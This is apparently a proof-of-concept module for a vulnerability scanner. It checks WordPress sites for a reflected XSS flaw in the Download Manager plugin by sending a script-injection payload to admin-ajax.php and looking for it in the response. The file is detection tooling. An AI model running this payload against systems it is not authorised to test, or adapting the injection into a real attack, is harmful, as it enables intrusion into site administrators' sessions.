# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re


class Vuln(ABVuln):
    vuln_id = 'WordPress_0063'  # 平台漏洞编号，留空
    name = 'WordPress Download Manager 2.9.46 / 2.9.51 XSS'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.XSS  # 漏洞类型
    disclosure_date = '2017-06-21'  # 漏洞公布时间
    desc = '''
        Reflected XSS in WordPress Download Manager could allow an attacker to do almost anything an admin can.
    '''  # 漏洞描述
    ref = 'https://www.sitedirsec.com/exploit-1950.html'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'WordPress'  # 漏洞应用名称
    product_version = 'WordPress Download Manager 2.9.46 / 2.9.51n'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '37d58c96-d089-4d29-b245-d18df881ba7d'
    author = '47bwy'  # POC编写者
    create_date = '2018-06-09'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }
                    
    def verify(self):
        self.target = self.target.rstrip('/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            '''
            Sign in
            Activate the plugin
            Visit the following URL in a browser without XSS mitigation (i.e. Firefox):
            '''
            payload = '/wp-admin/admin-ajax.php?action=wpdm_generate_password&id=%3C/script%3E%3Cscript%3Ealert(cscan)%3C/script%3E'
            url = self.target + payload
            r = requests.get(url)
            if r.status_code == 200 and '</script><script>alert(cscan)</script>' in r.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
